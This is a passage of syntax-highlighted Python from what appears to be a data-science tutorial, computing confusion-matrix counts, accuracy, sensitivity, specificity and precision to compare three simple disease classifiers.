style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">sum</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_true </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_pred </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Calculate metrics</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    accuracy </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">TP </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> TN</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">len</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_true</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    sensitivity </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> TP </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">TP </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> FN</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">TP </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> FN</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># True Positive Rate</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    specificity </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> TN </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">TN </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> FP</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">TN </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> FP</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># True Negative Rate</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    precision </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> TP </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">TP </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> FP</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">TP </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> FP</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># "When we predict disease, are we right?"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    recall </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> sensitivity  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Same as sensitivity - "Did we catch disease cases?"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Print results</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"\n</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation string" style="color:hsl(119, 34%, 47%)">'='</span><span class="token string-interpolation interpolation operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">70</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Classification Evaluation: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">model_name</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation string" style="color:hsl(119, 34%, 47%)">'='</span><span class="token string-interpolation interpolation operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">70</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"\nConfusion Matrix:"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"  True Positives (TP):   </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">TP</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">3d</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">  → correctly identified disease patients"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"  True Negatives (TN):   </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">TN</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">3d</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">  → correctly identified healthy people"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"  False Positives (FP):  </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">FP</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">3d</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">  → false alarms (healthy → disease)"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"  False Negatives (FN):  </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">FN</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">3d</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">  → missed cases (disease → healthy)"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"\nPerformance Metrics:"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"  Accuracy:         </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">accuracy</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">.2%</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">   (overall correctness - MISLEADING for imbalanced data!)"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"  Sensitivity/Recall: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">recall</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">.2%</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">   (disease detection rate - % of disease cases caught)"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"  Specificity:      </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">specificity</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">.2%</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">   (healthy detection rate - % of healthy cases caught)"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"  Precision:        </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">precision</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">.2%</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">   (positive predictive value - % of disease predictions correct)"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Rating based on both recall and precision</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> recall </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0.90</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">and</span><span class="token plain"> precision </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0.90</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        rating </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"✓ Excellent classifier"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">elif</span><span class="token plain"> recall </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0.80</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">and</span><span class="token plain"> precision </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0.70</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        rating </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"✓ Good classifier"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">elif</span><span class="token plain"> recall </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0.70</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">or</span><span class="token plain"> precision </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0.70</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        rating </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"△ Acceptable classifier"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        rating </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"✗ Poor classifier"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"  → </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">rating</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"\n  💡 Insight: High accuracy (</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">accuracy</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">.0%</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">) but low specificity (</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">specificity</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">.0%</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">)"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"             This shows CLASS IMBALANCE—model predicts disease for almost everything!"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">'accuracy'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> accuracy</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">'sensitivity'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> recall</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">'specificity'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> specificity</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">'precision'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> precision</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">'recall'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> recall</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">'TP'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> TP</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'TN'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> TN</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'FP'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> FP</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'FN'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> FN</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Evaluate all three models</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"\n"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"="</span><span class="token operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token number" style="color:hsl(35, 99%, 36%)">70</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"CLASSIFICATION MODEL COMPARISON"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"="</span><span class="token operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token number" style="color:hsl(35, 99%, 36%)">70</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">results1 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> evaluate_classification</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_pred1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Model 1: Rule-Based (Gene_A &gt; 6.5)"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">results2 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> evaluate_classification</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_pred2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Model 2: Mean-Based Classifier"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">results3 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> evaluate_classification</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">y_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_pred3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Model 3: Nearest Centroid"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>Output:</strong></p>
